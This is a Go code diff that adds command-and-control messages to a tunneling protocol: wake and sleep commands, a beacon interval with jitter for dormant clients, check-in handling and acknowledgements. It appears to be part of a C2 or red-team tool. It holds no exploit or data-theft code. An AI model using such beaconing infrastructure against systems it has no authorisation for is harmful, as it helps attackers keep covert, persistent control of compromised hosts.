@@ -31,6 +31,16 @@ const (
 	PortFwdReq byte = 0x30
 	PortFwdAck byte = 0x31
 
+	// C&C control messages (server → client, sent on control stream).
+	CmdWake        byte = 0x40 // server tells client to start accepting data streams
+	CmdSleep       byte = 0x41 // server tells client to go dormant
+	CmdSleepCfg    byte = 0x42 // server sends sleep configuration (interval + jitter)
+	CmdCheckinDone byte = 0x43 // server tells dormant client: no pending commands, disconnect
+
+	// C&C responses (client → server, sent on control stream).
+	CmdAck  byte = 0x48 // client acknowledges a command
+	CmdNack byte = 0x49 // client rejects a command (payload: error string)
+
 	Disconnect byte = 0xFF
 )
 
@@ -64,11 +74,18 @@ type PortFwdAckPayload struct {
 	Error string `json:"error,omitempty"`
 }
 
+// SleepCfgPayload configures the client's beacon interval while dormant.
+type SleepCfgPayload struct {
+	IntervalSec int `json:"interval_sec"` // base beacon interval in seconds
+	JitterPct   int `json:"jitter_pct"`   // jitter percentage (0-100), applied as ±jitter_pct/2
+}
+
 // ClientInfoPayload carries metadata about the client.
 type ClientInfoPayload struct {
 	Hostname string `json:"hostname"`
 	OS       string `json:"os"`
 	Arch     string `json:"arch"`
+	Dormant  bool   `json:"dormant,omitempty"`
 }
 
 // WriteMessage writes a framed message to the writer.
@@ -148,6 +165,38 @@ func ReadConnectAck(r io.Reader) (bool, string, error) {
 		return false, "", fmt.Errorf("decode CONNECT_ACK: %w", err)
 	}
 	return p.OK, p.Error, nil
+}
+
+// WriteSleepCfg sends a CmdSleepCfg message with the given configuration.
+func WriteSleepCfg(w io.Writer, cfg SleepCfgPayload) error {
+	payload, _ := json.Marshal(cfg)
+	return WriteMessage(w, &Message{Type: CmdSleepCfg, Payload: payload})
+}
+
+// ReadSleepCfg reads and parses a CmdSleepCfg message.
+func ReadSleepCfg(r io.Reader) (SleepCfgPayload, error) {
+	msg, err := ReadMessage(r)
+	if err != nil {
+		return SleepCfgPayload{}, err
+	}
+	if msg.Type != CmdSleepCfg {
+		return SleepCfgPayload{}, fmt.Errorf("expected CMD_SLEEP_CFG (0x%02x), got 0x%02x", CmdSleepCfg, msg.Type)
+	}
+	var p SleepCfgPayload
+	if err := json.Unmarshal(msg.Payload, &p); err != nil {
+		return SleepCfgPayload{}, fmt.Errorf("decode CMD_SLEEP_CFG: %w", err)
+	}
+	return p, nil
+}
+
+// WriteCmdAck sends a CmdAck message.
+func WriteCmdAck(w io.Writer) error {
+	return WriteMessage(w, &Message{Type: CmdAck})
+}
+
+// WriteCmdNack sends a CmdNack message with an error string payload.
+func WriteCmdNack(w io.Writer, errMsg string) error {
+	return WriteMessage(w, &Message{Type: CmdNack, Payload: []byte(errMsg)})
 }
 
 // ServerHandshake performs the server side of the HMAC challenge-response auth.
